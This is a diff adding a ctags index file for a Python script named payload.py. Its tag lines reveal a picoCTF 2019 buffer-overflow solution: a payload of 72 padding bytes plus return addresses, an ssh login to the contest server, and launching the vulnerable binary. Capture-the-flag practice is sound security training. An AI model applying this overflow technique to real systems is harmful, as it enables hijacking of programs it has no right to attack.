@@ -1,0 +1,16 @@
+!_TAG_FILE_FORMAT	2	/extended format; --format=1 will not append ;" to lines/
+!_TAG_FILE_SORTED	1	/0=unsorted, 1=sorted, 2=foldcase/
+!_TAG_OUTPUT_MODE	u-ctags	/u-ctags or e-ctags/
+!_TAG_PROGRAM_AUTHOR	Universal Ctags Team	//
+!_TAG_PROGRAM_NAME	Universal Ctags	/Derived from Exuberant Ctags/
+!_TAG_PROGRAM_URL	https://ctags.io/	/official site/
+!_TAG_PROGRAM_VERSION	0.0.0	/3fdf28bc/
+args	payload.py	/^args = sys.argv$/;"	v
+flag_addr	payload.py	/^flag_addr = 0x00400767$/;"	v
+jmp_addr	payload.py	/^jmp_addr = 0x00400850$/;"	v
+payload	payload.py	/^payload = 'a'*72 + p64(jmp_addr)+p64(flag_addr)$/;"	v
+pw	payload.py	/^    pw = args[2].strip('pass=')$/;"	v
+pw	payload.py	/^pw = None$/;"	v
+s	payload.py	/^s = ssh(host='2019shell1.picoctf.com',user=user,passwords=pw)$/;"	v
+sh	payload.py	/^sh = s.process('vuln', cwd = '\/problems\/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50')$/;"	v
+user	payload.py	/^user = None$/;"	v
